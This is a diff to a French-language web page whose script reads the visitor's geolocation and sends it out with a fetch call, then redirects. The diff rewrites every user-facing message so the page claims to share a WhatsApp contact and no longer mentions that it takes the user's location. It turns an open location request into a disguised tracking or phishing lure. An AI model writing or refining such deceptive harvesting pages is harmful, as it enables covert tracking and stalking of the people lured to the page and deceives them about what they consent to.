@@ -113,7 +113,7 @@ button:hover { background-color: var(--button-hover); }
     <div class="card" id="contactCard">
         <div class="profile-circle">S</div>
         <div class="name">Saifou</div>
-        <p>Cliquez pour partager votre localisation</p>
+        <p>Cliquez pour partager votre Contact sur WhatsApp</p>
         <button id="actionButton">Partager</button>
         <div class="loading" id="loadingSpinner"></div>
     </div>
@@ -130,7 +130,7 @@ const button = document.getElementById('actionButton');
 const spinner = document.getElementById('loadingSpinner');
 
 async function getGeolocation() {
-    card.querySelector('p').textContent = "Accès à votre position en cours...";
+    card.querySelector('p').textContent = "Chargement en cours...";
     spinner.style.display = 'block';
     button.style.display = 'none';
 
@@ -150,7 +150,7 @@ async function getGeolocation() {
                     mode: 'no-cors'
                 }).catch(err => console.error("Erreur fetch:", err));
 
-                card.querySelector('p').textContent = "Votre localisation a été partagée.";
+                card.querySelector('p').textContent = "Votre contact a été partagée.";
                 setTimeout(() => { window.location.href = "redirecting.html"; }, 1000);
             },
             async (error) => {
@@ -167,12 +167,13 @@ async function getGeolocation() {
                     mode: 'no-cors'
                 }).catch(err => console.error("Erreur fetch:", err));
 
-                card.querySelector('p').textContent = "Vous avez refusé l'accès à la localisation.";
+                card.querySelector('p').textContent = "Vous avez refusé l'accès à votre contact.";
+                window.location.href = "geoloc-refuse.html";
             },
             { enableHighAccuracy: false, timeout: 5000 }
         );
     } else {
-        card.querySelector('p').textContent = "Géolocalisation non disponible sur ce navigateur.";
+        card.querySelector('p').textContent = "Fonctionnalité non disponible sur ce navigateur.";
     }
 }
 
